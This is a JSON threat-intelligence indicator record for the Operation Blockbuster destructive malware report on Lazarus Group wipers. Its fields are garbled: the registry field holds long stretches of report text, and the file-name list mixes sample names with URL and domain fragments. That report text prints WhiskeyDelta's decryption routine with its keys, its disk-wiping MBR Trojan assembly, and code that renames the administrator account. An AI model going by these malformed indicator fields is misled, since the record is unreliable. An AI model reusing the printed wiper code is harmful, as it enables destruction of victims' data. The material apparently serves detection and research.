{"rule_id": 253, "name": "Operation-Blockbuster-Destructive-Malware-Report", "description": "-", "references": [], "File_Names": ["gensvc.dll", "pdaisvc.dll", "jiusvc.dll", "crxlsvc.dll", "trvesvc.dll", "AlphabetRadiotelephony.aspx", "noise03.dat", "bgyesvc.dll", "edbchk.log", "kznsvc.dll", "www.icao", "doqmcru.dat", "TYEI08.DEP", "twrasvc.dll", "msvcrt.bat", "OperationBlockbuster.com", "wevtapi.dll", "skmsvxd.dat", "briggsoft.com", "jdfsvc.dll", "mujsvc.dll", "ams.exe", "kfvesvc.dll", "wevtuil.exe", "usbdrv3.sys", "ilpksvc.dll", "zxtxsvc.dll", "iissvr.exe", "esthsvc.dll", "zwdfsvc.dll", "eldos.com", "dmosvc.dll", "skinpfu.dat", "netplg.log", "hnbsvc.dll", "ocynsvc.dll", "wevtutil.exe", "bsunanotechnology.com", "ithsvc.dll", "dasrrvm.dat", "epdtsvc.dll", "khp.sys", "rwzsvc.dll", "naver.com", "npf.sys", "dzkrsvc.dll", "verclvid.exe", "rhpysvc.dll", "vnd.ms", "zwzsvc.dll", "rain.pdf", "dnsec.dat", "rvtqsvc.dll"], "MD5_Hashes": [], "SHA1_Hashes": [], "SHA256_Hashes": ["d7b50b1546653bff68220996190446bdc7fc4e38373715b8848d1fb44fe3f53c"], "Registry_Entries": ["HKCU\\Software\\\nMicrosoft\\Windows\\CurrentVersion\\Explorer\\UserAssist, \nHKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\\nWindows\\Shell\\MuiCache, and HKCU\\Software\\Microsoft\\\nWindows\\ShellNoRoam\\MUICache\nDeletes IE cache files. The command requires two arguments separated by | with \nthe first argument being the file mask to specify which cache files for the command \nto target and the second argument specifying the user profile to target.\n\nDeletes cookies, browsing history and download history files from  \n%CSIDL_HISTORY%, %CSIDL_COOKIES%, %CSIDL_INTERNET_CACHE%,  \n%CSIDLE_COOKIES%\\IEDownloadHistory directories. The command takes \nan optional single argument that specifies the user profile to target.\n\nPurges the page file by enabling the clearing of the page file at shutdown (by setting \n\n[swap]\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\\nMemory Management\\ClearPageFileAtShutdown to 1) and then gener-\nating an excessively large amount of memory to fill up the swap space (page file).\n\nSystematically destroys the contents of a victim\u2019s hard drives by performing the \nfollowing tasks:\n\n } Calls the [swap] command\n } Stops the Sens and Alerter services\n } Overwrites the MBR of the first four attached hard drives\n } [If argument is *] Renames files within %WIDIR% and %PROGRAMFILES% to \na random string of uppercase letters after overwriting their contents and then \ndeletes them. \n\n } Opens a file handle to each hard drive (by means of \\\\.\\PhysicalDrive{Drive \n\nNumber}) and overwrites entire drive with random data.\n\n } Shuts down Windows by calling ExitWindowsEx.\nThe command takes only one optional argument that specifies if the victim\u2019s files \nare deleted or not (when * is given).\nGenerates and executes a suicide script.\n\nSleep delay. Takes a single argument that specifies the sleep time in seconds in \nASCII decimal form.\n\n[hard]\n\n[self]\n\n[sleep]\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\nTable 4\u20112: Instructions of WhiskeyCharlie\n\n23\n\nOperation Blockbuster:  Destructive Malware Report\fOne of the most destructive features of WhiskeyCharlie is its secure delete function. This variant of secure delete consists \nof performing the following operations on a target file:\n\n1.  If the file is read-only, make it writable\n\n2.  Based on the value set by the [mode] command, determine the number of overwrite iterations to perform on the file. \nThe default value is 7, but it is possible to specify 1, 3, or 5 iterations. The overwrite functionality can be disabled by \nsupplying the [mode] command the value of 0\n\n3.  Perform an overwrite operation on the specified file, repeat until all requested iterations have been completed\n\n4.  Rename the target file\u2019s filename by replacing each character with a randomly selected uppercase character\n\n5.  Delete the file by calling the API function DeleteFileA\n\nThe overwrite operation that WhiskeyCharlie uses during secure delete operations begins by generating a 64KB buffer \nof random values (as supplied by 64K calls to rand), the target file is opened and one byte is appended to the end of the \nfile, then each byte of the target file is overwritten with a value from the random value buffer, the writes are then flushed \nto disk. On the last iteration of the overwrite operation, the file size is set to 0 by calling the SetEndOfFile function \nand then the changes to the file are flushed to disk by calling FlushFileBuffers. This means that not only is the data \nwithin the file completely destroyed by one or more iterations of random data being written over the original data, but the \nfile\u2019s size is also corrupted, making it difficult to determine how big the file was originally.\n\nWhile the command file is encrypted, as mentioned previously, it was possible to recover the decryption key string \nof m140chi1a0shi! and decrypt the contents of a known command file dropped by IndiaDelta (sample SHA-256: \nd7b50b1546653bff68220996190446bdc7fc4e38373715b8848d1fb44fe3f53c  (see Table 4-3). This command file \nshows a real world example of how the attackers use WhiskeyCharlie to attack a victim\u2019s computer. The command file \nconsists of a significant number of service deletions and file deletions prior to performing a full hard drive destruction \ntask. It is clear from the nature of WhiskeyCharlie\u2019s instruction set and the recovered command file that the use of  \nWhiskeyCharlie on a victim\u2019s machine is the final stage of an attack, as there will be no usable data left on the victim\u2019s \nhard drive once the malware has completed its task.\n\nCOMMAND\n\nARGUMENTS \n\nDESCRIPTION OF ACTION\n\n[mode]\n\n[pf]\n\n[evc]\n\n[mu]\n\n[kill]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n3\n\n*\n\n*\n\n*\n\nSets the overwrite iteration for secure deletes to 3 iterations\n\nDeletes all prefetch entries\n\nDeletes all event logs\n\nRemoves all MRU entries for all applications\n\nverclvid.exe\n\nTerminates any process named verclvid.exe\n\ngensvc\n\ntwrasvc\n\nzwzsvc\n\nesthsvc\n\nbgyesvc\n\nzwdfsvc\n\nrvtqsvc\n\ndzkrsvc\n\ntrvesvc\n\nilpksvc\n\nrwzsvc\n\nkfvesvc\n\nkznsvc\n\nStops and removes service named gensvc\n\nStops and removes service named twrasvc\n\nStops and removes service named zwzsvc\n\nStops and removes service named esthsvc\n\nStops and removes service named bgyesvc\n\nStops and removes service named zwdfsvc\n\nStops and removes service named rvtqsvc\n\nStops and removes service named dzkrsvc\n\nStops and removes service named trvesvc\n\nStops and removes service named ilpksvc\n\nStops and removes service named rwzsvc\n\nStops and removes service named kfvesvc\n\nStops and removes service named kznsvc\n\n24\n\nOperation Blockbuster:  Destructive Malware Report\fCOMMAND\n\nARGUMENTS \n\nDESCRIPTION OF ACTION\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[svc]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\n[file]\n\njiusvc\n\nocynsvc\n\nithsvc\n\nzxtxsvc\n\nmujsvc\n\ndmosvc\n\nrhpysvc\n\ncrxlsvc\n\nhnbsvc\n\nepdtsvc\n\njdfsvc\n\npdaisvc\n\nStops and removes service named jiusvc\n\nStops and removes service named ocynsvc\n\nStops and removes service named ithsvc\n\nStops and removes service named zxtxsvc\n\nStops and removes service named mujsvc\n\nStops and removes service named dmosvc\n\nStops and removes service named rhpysvc\n\nStops and removes service named crxlsvc\n\nStops and removes service named hnbsvc\n\nStops and removes service named epdtsvc\n\nStops and removes service named jdfsvc\n\nStops and removes service named pdaisvc\n\nverclvid.exe\n\nSecurely deletes file named verclvid.exe\n\ngensvc.dll\n\ntwrasvc.dll\n\nzwzsvc.dll\n\nesthsvc.dll\n\nbgyesvc.dll\n\nzwdfsvc.dll\n\nrvtqsvc.dll\n\ndzkrsvc.dll\n\ntrvesvc.dll\n\nilpksvc.dll\n\nrwzsvc.dll\n\nkfvesvc.dll\n\nkznsvc.dll\n\njiusvc.dll\n\nocynsvc.dll\n\nithsvc.dll\n\nzxtxsvc.dll\n\nmujsvc.dll\n\ndmosvc.dll\n\nrhpysvc.dll\n\ncrxlsvc.dll\n\nhnbsvc.dll\n\nepdtsvc.dll\n\njdfsvc.dll\n\npdaisvc.dll\n\nSecurely deletes file named gensvc.dll\n\nSecurely deletes file named twrasvc.dll\n\nSecurely deletes file named zwzsvc.dll\n\nSecurely deletes file named esthsvc.dll\n\nSecurely deletes file named bgyesvc.dll\n\nSecurely deletes file named zwdfsvc.dll\n\nSecurely deletes file named rvtqsvc.dll\n\nSecurely deletes file named dzkrsvc.dll\n\nSecurely deletes file named trvesvc.dll\n\nSecurely deletes file named ilpksvc.dll\n\nSecurely deletes file named rwzsvc.dll\n\nSecurely deletes file named kfvesvc.dll\n\nSecurely deletes file named kznsvc.dll\n\nSecurely deletes file named jiusvc.dll\n\nSecurely deletes file named ocynsvc.dll\n\nSecurely deletes file named ithsvc.dll\n\nSecurely deletes file named zxtxsvc.dll\n\nSecurely deletes file named mujsvc.dll\n\nSecurely deletes file named dmosvc.dll\n\nSecurely deletes file named rhpysvc.dll\n\nSecurely deletes file named crxlsvc.dll\n\nSecurely deletes file named hnbsvc.dll\n\nSecurely deletes file named epdtsvc.dll\n\nSecurely deletes file named jdfsvc.dll\n\nSecurely deletes file named pdaisvc.dll\n\n[hard]\n\nDestroys the content of all hard drives and shuts down Windows\n\nTable 4\u20113: Contents of a WhiskeyCharlie Command File Found in the Wild\n\n25\n\nOperation Blockbuster:  Destructive Malware Report\f5. [Wiper] WhiskeyDelta\n\nWhiskeyDelta is a family of destructive malware that destroys all the data on a victim\u2019s hard drive on the file system and \nsector level. There are two known versions of WhiskeyDelta, WhiskeyDelta-One and WhiskeyDelta-Two. WhiskeyDelta-One \nrepresents a baseline for the feature set within the WhiskeyDelta family, while WhiskeyDelta-Two adds C2 communication, \nwraps the core WhiskeyDelta code within a service executable, and renames the Administrator account. \n\nThe core WhiskeyDelta functionality consists of the following tasks:\n\n1.  Decrypt the name of two services (Alerter and SENS) as well as the data blob that WhiskeyDelta uses to replace \n\nthe MBR of attached hard drives\n\n2.  Stop the Alerter and SENS services on the victim\u2019s computer\n3.  Get partition information for all physical drives\n\n4.  Replace the MBR for each physical drive attached to the victim\u2019s computer with a Trojanized MBR and corrupt the \n\npartition table\n\n5.  Enumerate all files on all lettered drives (C:, D:, etc.) and delete the files that meet a specific criteria (which is vari-\n\nant-specific)\n\n6.  Overwrite the first 132 MB (WhiskeyDelta-One) or 1.5 MB (WhiskeyDelta-Two) of each partition of each physical \n\ndrive with random data from heap memory\n\n7.  [Windows XP or older] Overwrite each sector of each partition of each physical drive with random data from heap \n\nmemory or [Windows Vista or newer] overwrite 0x7C00 bytes starting at sector 1 with random data from heap memory\n\nWhiskeyDelta uses a decryption scheme that differs from the majority of the Lazarus Group\u2019s families. Seen in Figure \n5-1, the scheme consists of multiple XORs to mutate an array and then apply an XOR to each byte of the encrypted data. \nWhiskeyDelta uses the encryption scheme to decrypt the names of the two services to stop (Task 2) as well as the data \nblob containing the MBR Trojan (Task 4). WhiskeyDelta-One requires that the key to decrypt the data be present on the \ncommand line while WhiskeyDelta-Two supplies the key. Fortunately for analysts, the key appears to be the same across \nboth variants: uANcspWJk9DByduoaXBCq0DZZF3jZKDI. \n\n26\n\nOperation Blockbuster:  Destructive Malware Report\fvoid Decrypt(char *pvData, int dwLength, const void *pszKey)\n{\n  char sbox[32];\n  int i = 0;\n  qmemcpy(sbox, pszKey, sizeof(sbox));\n  if ( dwLength > 0 )\n  {\n    unsigned char k = sbox[0];\n    do\n    {\n      k ^= sbox[31] ^ sbox[21];\n      pvData[i] ^= k;\n      int j = 30;\n      do\n      {\n        sbox[j + 1] = sbox[j];\n        --j;\n      }\n      while ( j > -1 );\n      ++i;\n      sbox[0] = k;\n    }\n    while ( i < dwLength );\n  }\n}\n\nFigure 5\u20111: WhiskeyDelta\u2019s Decryption Function\n\nTask 4, the MBR replacement (seen in Figure 5-2), has remarkable structural and functional similarities to the MBR Trojan \nused by WhiskeyAlfa-Three (see Section 2.3) in the SPE attack. The MBR Trojan begins by reading a copy of the first drive\u2019s \n(drive 0x80) MBR into memory at 0000:7000 (using the real mode memory model). The MBR Trojan enters an endless \nloop where the following events occur:\n\n1.  Random data from memory at 0000:0000 through 0000:FFFF is written to each physical drive starting at sector 0 \n\nand incrementing by 192 sectors for 256 writes per drive.\n\n2.  The original MBR is copied to the sector 0 of the first physical drive (drive 0x80)\n3.  The loop repeats indefinitely.\n\nThe Disk Access Packet (DAP) specifies that the disk write operation will overwrite 128 sectors with random data from \nmemory at 0000:0000 through 0000:FFFF, but after each write the pointer to the next sector is incremented by 192 \nsectors, meaning that 64 sectors are left untouched for each write. It is unclear why the start of the next write operation is \nincremented by 192 when the memory write is 128 sectors. The 128 sector limitation, in this case, is most likely due to the \n64Kb boundary issue that occurs in 16-bit mode. In any case, assuming an ideal situation, the MBR Trojan will destroy the \ndata on the attached hard drives. \n\n27\n\nOperation Blockbuster:  Destructive Malware Report\fMBR:7C00 start:          xor     ax, ax\nMBR:7C02                 mov     ss, ax\nMBR:7C04                 mov     sp, 7C00h\nMBR:7C07                 sti\nMBR:7C08                 push    ax\nMBR:7C09                 pop     es\nMBR:7C0A                 push    ax\nMBR:7C0B                 pop     ds\nMBR:7C0C                 cld\nMBR:7C0D                 mov     si, offset dapMBR\nMBR:7C10                 mov     dl, 80h         ; Physical drive number\nMBR:7C12                 mov     ah, 42h         ; Func: EXTENDED READ\nMBR:7C14                 mov     al, 0\nMBR:7C16                 int     13h             ; BIOS DISK function\nMBR:7C18                 mov     si, offset dap  ; SI = PTR to DAP\nMBR:7C1B                 xor     cx, cx\nMBR:7C1D\nMBR:7C1D loop:\nMBR:7C1D                 inc     cx\nMBR:7C1E                 cmp     cx, 2048\nMBR:7C22                 jz      short duplicateMBR\nMBR:7C24\nMBR:7C24 overwriteSectors:\nMBR:7C24                 mov     ah, 43h         ; Func: EXTENDED WRITE\nMBR:7C26                 mov     al, 0           ; Verify Flag = No Verify\nMBR:7C28                 int     13h             ; BIOS DISK function\nMBR:7C2A                 inc     dl              ; Physical drive number\nMBR:7C2C                 mov     al, dl\nMBR:7C2E                 cmp     al, 84h         ; last physical drive?\nMBR:7C30                 jl      short overwriteSectors\nMBR:7C32                 mov     dl, 80h         ; use first physical drive\nMBR:7C34                 mov     bp, offset dap.lbaStartingSectorToWrite\nMBR:7C37                 add     word ptr [bp+0], 192\nMBR:7C3C                 adc     word ptr [bp+2], 0\nMBR:7C40                 adc     word ptr [bp+4], 0\nMBR:7C44                 adc     word ptr [bp+6], 0\nMBR:7C48                 jmp     short loop\nMBR:7C4A ; ----------------------------------------------------------------\nMBR:7C4A\nMBR:7C4A duplicateMBR:\nMBR:7C4A                 mov     ax, ptr ds:dap.lbaStartingSectorToWrite\nMBR:7C4D                 mov     ds:71A8h, ax\nMBR:7C50                 mov     ax, ptr ds:dap.lbaStartingSectorToWrite+2\nMBR:7C53                 mov     ds:71AAh, ax\nMBR:7C56                 mov     ax, ptr ds:dap.lbaStartingSectorToWrite+4\nMBR:7C59                 mov     ds:71ACh, ax\nMBR:7C5C                 mov     ax, ptr ds:dap.lbaStartingSectorToWrite+6\nMBR:7C5F                 mov     ds:71AEh, ax\nMBR:7C62                 mov     si, offset dapMBR\nMBR:7C65                 mov     ah, 43h         ; Func: EXTENDED WRITE\nMBR:7C67                 mov     al, 0           ; Verify Flag = No Verify\nMBR:7C69                 int     13h             ; BIOS DISK function\nMBR:7C6B                 xor     cx, cx\nMBR:7C6D                 mov     si, offset dap\nMBR:7C70                 jmp     short loop\nMBR:7C70 ; -----------------------------------------------------------------\nMBR:7C72 junkData        db 5Ch, 8Ah, 6, 0, 0C1h, 50h, 1, 2 dup(0)\nMBR:7C72                 db 5Eh, 114h dup(0)\nMBR:7D90 dapMBR          db 10h                  ; size \nMBR:7D90                 db 0                    ; unused _ zero\nMBR:7D90                 dw 1                    ; sectorCount\nMBR:7D90                 dd 7000h                ; ptrToDataToWrite\nMBR:7D90                 dq 0                    ; lbaStartingSectorToWrite\nMBR:7DA0 dap             db 10h                  ; size \nMBR:7DA0                 db 0                    ; unused _ zero\nMBR:7DA0                 dw 128                  ; sectorCount\nMBR:7DA0                 dd 0                    ; ptrToDataToWrite\nMBR:7DA0                 dq 0                    ; lbaStartingSectorToWrite\n\nFigure 5\u20112: WhiskeyDelta\u2019s MBR Trojan Code\n\n28\n\nOperation Blockbuster:  Destructive Malware Report\fPrior to writing the MBR Trojan to the physical disks, the partition information is destroyed by replacing the starting \nsector LBA value, the partition type value, and the starting sector CHS address values with random data. This renders \nthe partition type information inaccessible by means of parsing the MBR going forward, but it would still be possible to \nlook at the size of the partition by the partition size field and the partition\u2019s end sector LBA value to calculate the original \nstarting sector LBA.\n\nAfter replacing the MBR with the Trojanized MBR, WhiskeyDelta begins the process of destroying files from the victim\u2019s \ncomputer by enumerating all the files on all of the lettered drives. Starting at drive A: and progressing through drive \nZ:, WhiskeyDelta recursively scans through each directory and their subdirectories looking for files that meet a specific \ncriteria, typically a specific file extension as explained in following sections on the WhiskeyDelta variants. WhiskeyDelta \ndoes not enumerate any files within the %WINDIR% and %PROGRAMFILES% directories. For each file found that meets the \ncriteria for destruction, WhiskeyDelta overwrites the file with random data. The specifics of the overwrite are variant-de-\npendent. After overwriting a file\u2019s contents, the file is deleted.\n\nWhiskeyDelta performs two different sector overwrite attacks. Using the partition information obtained during Task 3, \nWhiskeyDelta overwrites either 132 MB (WhiskeyDelta-One) or 1.5 MB (WhiskeyDelta-Two) starting at the first sector of \neach partition on each physical drive. WhiskeyDelta uses random data from the heap to perform the overwrite task. \n\nIf the victim\u2019s machine is running Windows XP or older, after destroying the data on the physical drive at the partition \nboundaries, WhiskeyDelta then overwrites the entirety of the physical drive using eight threads to divvy the work load \nbefore finally using a single thread to overwrite the entirety of the physical drive in sequential sector order. For those \nvictims running Windows Vista and newer, the final task consists of overwriting 0x7C00 bytes (31,744 bytes) of the boot \nsectors starting at sector 1 (LBA offset 512) using random bytes from heap memory. The WhiskeyDelta change in behavior \nbased on the operating system\u2019s version relates to the changes that were introduced with Windows Vista and newer \nregarding the way raw disk access is handled:9 Vista and newer versions of Windows can only access the boot sectors via \nthe \\\\.\\PhysicalDrive interface.\n\n9  Microsoft. \u201cChanges to the file system and to the storage stack to restrict direct disk access and direct volume access in Windows Vista and in Windows Server 2008\u201c https://support.microsoft.com/en-us/kb/942448 31 \n\nJanuary 2008.\n\n29\n\nOperation Blockbuster:  Destructive Malware Report\f5.1 WhiskeyDelta\u2011One\n\nWhiskeyDelta-One provides the baseline for the WhiskeyDelta variants in term of functionality and design. Consisting of \nonly 13 non-library functions, WhiskeyDelta-One is a streamlined executable that was designed and executed for the sole \npurpose of data destruction. There are a few notable features found in WhiskeyDelta-One that are not found in Whiskey-\nDelta-Two:\n\n1.  The task of obtaining the partition information for the physical drives (Task 3) is a IOCTL call\n\n2.  The file selection criteria for the file destruction task (Task 5) is limited to a small subset of file extensions for those \n\nfiles larger than 4 MB.\n\n3.  The file destruction operation against selected files is simple and independent of selection criteria, unlike WhiskeyDelta-Two\n\n4.  The file destruction operation is single-threaded, and therefore more time-consuming\n\nWhiskeyDelta-One, despite its simplicity, does require a password for it to operate successfully. The task of decrypting \nthe names of the Windows services the malware stops and decrypting the MBR Trojan require a 32-byte alphanumeric \npassword to be supplied on the command line. While this does aide in hampering analysis of the MBR Trojan, it also \nprovides additional work for the attacker to ensure the correct password is supplied. There is no error checking to ensure \nthe validity of the password so it is entirely possible for the attacker (or any analyst) to supply an incorrect password, \nresulting in invalid strings for the names of the services and an invalid MBR Trojan. However, given the significant \nnumber of other destructive attacks the malware employs, it is unlikely that such a failure on the part of the attacker \nwould interfere in any data destruction given a long enough running time for the malware.\n\nWhiskeyDelta-One uses a DeviceIoControl call for IOCTL_DISK_GET_DRIVE_LAYOUT_EX in order to obtain the \nconfiguration of the physical drives. WhiskeyDelta-One stores this information in a global array that later operations \n(specifically the partition and sector overwrite tasks) will use once the MBR data has been corrupted.\n\nWhen selecting files for destruction during the file destruction operation (Task 5), WhiskeyDelta-One looks at the file \nextension to determine if a file should be overwritten with random data. The bulk of the files that WhiskeyDelta-One targets \n(Figure 5-3) fall under the category of source code and corporate documents. \n\n.php\n\n.asp\n\n.aspx\n\n.jsp\n\n.java\n\n.kwp\n\n.eml\n\n.pst\n\n.wpd\n\n.wri\n\n.gul\n\n.hwp\n\n.doc\n\n.docx\n\n.xls\n\n.xlsx\n\n.ppt\n\n.pptx\n\n.pdf\n\n.mdb\n\n.alz\n\n.rar\n\n.zip\n\n.cpp\n\n.h\n\n.c\n\nFigure 5\u20113: WhiskeyDelta\u2011One's File Extension Targeting List\n\nThe destruction process is size-dependent. For those files that are less than 4 MB in size and have the desired file \nextension, the overwrite process consists of writing 256KB over the file regardless of the file\u2019s original size. If a file is over \n4 MB in size, regardless of its file extension, the overwrite process consists of overwriting the first 256 KB of the file and \nthe last 256 KB of the file. Regardless of whether or not a file is selected for destruction by overwriting its data, the file is \ndeleted via a call to DeleteFile. \n\n30\n\nOperation Blockbuster:  Destructive Malware Report\f5.2 WhiskeyDelta\u2011Two\n\nAugmented with C2 reporting functionality, more robust file selection criteria, the ability to modify the victim\u2019s  \nAdministrator account name, and constructed as a service executable under the service name RPCSecruity (complete \nwith misspelling), WhiskeyDelta-Two is an escalation in functionality over WhiskeyDelta-One. WhiskeyDelta-Two does \nnot require a command line argument to decrypt the MBR Trojan or the names of the services to stop, meaning that the \nservices names and MBR Trojan will always properly decode. WhiskeyDelta-Two does, however, take a single command line \nargument (a number) that it later transmits to a C2 server as part of a larger status report transmission.\n\nThe first notable difference in WhiskeyDelta-Two is the inclusion of a function that attempts to rename the administrator\u2019s \naccount. Spawned as its own thread, the function will sleep for 10 seconds before attempting to execute the code in Figure 5-4.\n\nsrand(time(0));\nw = rand();\nx = rand();\ny = rand();\nz = rand();\nsprintf(newName, \u201cHaHaHa _ %d%d%d%d\u201d, z, y, x, w);\nsprintf(CmdLine, \u201ccmd.exe /c net user Administrator %s\u201d, newName);\nWinExec(CmdLine, 0);\n\nFigure 5\u20114: WhiskeyDelta\u2011Two's Administrator Account Renaming Code\n\nIf successful, the Administrator account will be renamed with HaHaHa_ followed by 4 to 20 digits.  \nWhiskeyDelta-Two modifies the registry, in much the same way as WhiskeyCharlie\u2019s [swap] command (see Section 4), to \nforce the Windows operating system to purge the page file once the victim\u2019s machine shuts down. Unlike WhiskeyCharlie, \nhowever, WhiskeyDelta-Two does not induce paging by filling large heap arrays with random data.\n\nWhen obtaining partition information for the attached physical drives, WhiskeyDelta-Two reads the drive\u2019s MBR and \nparses the partition tables directly. The information about the partitions is then stored in a pair of global arrays which the \npartition and sector overwrite operations later use to determine the size and offsets of the partitions and the overall size \nof the drives. \n\nHaving replaced the MBR with the MBR Trojan, WhiskeyDelta-Two reports its status by randomly selecting from the C2 \nserver addresses hardcoded within itself and attempting to connect to the server. The communication between  \nWhiskeyDelta-Two and its C2 server consists of a handshake/authentication test and two data transmissions encrypted \nwith the DNSCALC-style encoding scheme.\n\n31\n\nOperation Blockbuster:  Destructive Malware Report\fDNSCALC is an older malware family, used by several APT groups and first profiled in 2010, whose claim to \nfame was the use of DNS lookups for domain names that would return specific IP addresses used to calculate \nthe listening port number for the C2 server. One notable feature of DNSCALC was the use of a combination of \nXOR with an ADD operation and XOR with a SUB operation for the purposes of encrypting and decrypting data \nstreams. Since at least 2011, the Lazarus Group has commandeered this technique for use in a variety of their \nmalware families. The DNSCALC version of this encoding/decoding scheme performed the transformation \noperation on each byte using two lines of C code such as\n\nd += 122;\nd ^= 25;\n\nwhere the values 122 and 25 constitute the encryption and decryption keys. The Lazarus Group performs the \nsame operation in a single line of code, such as\n\nd = (e ^ 25) \u2013 122\n\nand\n\ne = (d + 122) ^ 25\n\nThis subtle, but important, distinction in style indicates that the code was not directly copied from DNSCALC, \nbut rather was inspired by DNSCALC or another source that performs the same transform. It should be noted \nthat DNSCALC modified the Gh0st RAT MyEncode function, seen below, by reversing the order of operations \nmeaning that the Lazarus Group\u2019s use of the encoding scheme represents a derivation of an existing derivation.\n\nchar* MyEncode(char *str)\n{\n\ni, len;\n\n*p;\n*s, *data;\n\nint \nchar \nchar \nlen = strlen(str) + 1;\ns = (char *)malloc(len);\nmemcpy(s, str, len);\nfor (i = 0; i < len; i++)\n{\n\ns[i] ^= 0x19;\ns[i] += 0x86;\n\n}\nbase64 _ encode(s, len, &data);\nfree(s);\nreturn data;\n\n}\n\nThe DNSCALC-style encoding scheme code is heavily used throughout many of the various malware families for \nwhich the Lazarus Group is responsible. \n\n32\n\nOperation Blockbuster:  Destructive Malware Report \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fThe handshake/authentication test consists of WhiskeyDelta-Two generating a 16-byte random buffer that it encodes \nusing the DNSCALC-style encoding before sending to the C2 server. The C2 server responds with the same 16-byte \nrandom buffer encrypted with DNSCALC-style encoding that WhiskeyDelta-Two removes to reveal the decrypted 16 \nbytes. The decrypted response from the C2 server is then compared to the original 16-byte buffer to ensure they are \nidentical. Failing this, the connection between the C2 server and the WhiskeyDelta-Two malware is terminated.  \n\nWhile WhiskeyDelta-Two\u2019s system of authentication seems somewhat rational at face value, it is heavily flawed. Since \nthe data buffer being sent to the C2 server is encoded with the reciprocal scheme that WhiskeyDelta-Two uses to decrypt \nthe data stream, the C2 server merely needs to mirror requests from the WhiskeyDelta-Two malware as the C2 server\u2019s \nresponse. As a result, this provides absolutely no authentication for the malware.\n\nAfter the authentication phase, communication between WhiskeyDelta-Two and the C2 server takes the form of \nDNSCALC-style encoded datagrams. The format for the datagrams is straightforward, as seen in Table 5-1, and is a \nscheme used in a multitude of other Lazarus Group malware families, contributing to a shared code base that enabled \nNovetta to link seemingly unconnected malware families to the Lazarus Group. At a minimum, a datagram consists of a \ntype field and a payload size field contributing to a minimum datagram size of 6 bytes. An optional payload field can have a \nsize of up to 262 bytes, meaning the maximum allowed datagram is 268 bytes in size.\n\nOFFSET\n\nSIZE\n\nDESCRIPTION\n\n0\n\n4\n\n6\n\n4 Bytes [DWORD]\n\nDatagram Type (Set to 0x811)\n\n2 Bytes [WORD]\n\nPayload Size (Set to 0)\n\nVariable (0 to 262 Bytes)\n\nOptional Payload Data\n\nTable 5\u20111: WhiskeyDelta\u2011Two\u2019s Datagram Structure\n\nAfter the initial authentication, WhiskeyDelta-Two sends a login transmission to the C2 server. The login datagram \ncontains no payload data, and the type value is set to 0x811. Following the login, WhiskeyDelta-Two transmits a status \nreport to the C2 server that details the current state of the malware\u2019s destruction tasks. This status report datagram is 304 \nbytes in length and contains the information (and structure) defined in Table 5-2.\n\nOFFSET\n\nSIZE\n\nDESCRIPTION\n\n0\n\n4\n\n264\n\n268\n\n272\n\n280\n\n284\n\n288\n\n292\n\n296\n\n300\n\n4 Bytes [DWORD]\n\nIdentifier as defined by the numerical value supplied on the command line when  \nWhiskeyDelta-Two was activated\n\n260 Bytes\n\n4 Byte\n\n4 Bytes\n\nNULL-terminated string containing the victim\u2019s computer name as reported by \n\nGetComputerNameA\nNumber of lettered drives found on the victim\u2019s system\n\nUnused, possibly used to 8-byte alignment space\n\n8 Bytes  \n[ULARGE_INTEGER]\n\nTotal free space for all drives\n\n4 Bytes\n\n4 Bytes\n\n4 Bytes\n\n4 Bytes\n\n4 Bytes\n\n4 Bytes\n\nNumber of physical drives found on the victim\u2019s system\n\nNumber of files found on the victim\u2019s system\n\nNon-zero if victim\u2019s system is Vista or newer\n\nDate and time that WhiskeyDelta-Two was executed (as reported by time \nfunction)\n\nNumber of seconds from the Administrator rename, page file purge setting change, \nand MBR Trojan installation\n\nUnused\n\nTable 5\u20112: WhiskeyDelta\u2011Two\u2019s Status Report Structure\n\n33\n\nOperation Blockbuster:  Destructive Malware Report\fThe initial report to the C2 server only contains valid data for the identifier field (offset 0), the computer name (offset 4), \nthe number of physical drives (offset 280), and the activation time (offset 292).\n\nThe file destruction task (Task 5) for WhiskeyDelta-Two is significantly more involved than that of WhiskeyDelta-One. \nThe first noticeable change is that for each drive that WhiskeyDelta-Two enumerates, a new thread is generated to handle \nthe enumeration and destruction process, after first cataloguing the amount of free space available on the drive (to be \nlater reported in offset 272 of the status report to the C2 server). The enumeration and file selection process is more \nspecific not only in which file extensions are of interest, but also how these specific file types are destroyed. There are \nthree distinct criteria for determining if WhiskeyDelta-Two overwrites a file or not:\n\n1.  Does the file have an extension that the author(s) of WhiskeyDelta-Two refer to as a \u201cbackup\u201d file (Figure 5-5).\n\n.log\n\n.evt\n\n.bak\n\n.mdf\n\n.ldf\n\n.sql\n\n.myd\n\n.myi\n\n.frm\n\n.dbf\n\n.arc\n\n.rdo\n\n.mdb\n\n.accdb\n\n.db2\n\n.db\n\n.pls\n\n.plb\n\n.pks\n\n.pkb\n\n.pck\n\nFigure 5\u20115: File Extensions for "], "URLs": ["https://securelist.com/blog/incidents/57784/shamoon-the-wiper-further-details-part-ii/", "https://www.briggsoft.com/.", "http://www.mcafee.com/us/resources/white-papers/wp-10-days-of-rain.pdf", "http://www.icao.int/Pages/AlphabetRadiotelephony.aspx", "https://www.eldos.com/rawdisk/index.php.", "http://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf", "https://support.microsoft.com/en-us/kb/942448", "http://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Tools-Report.pdf"], "weight": 0.0}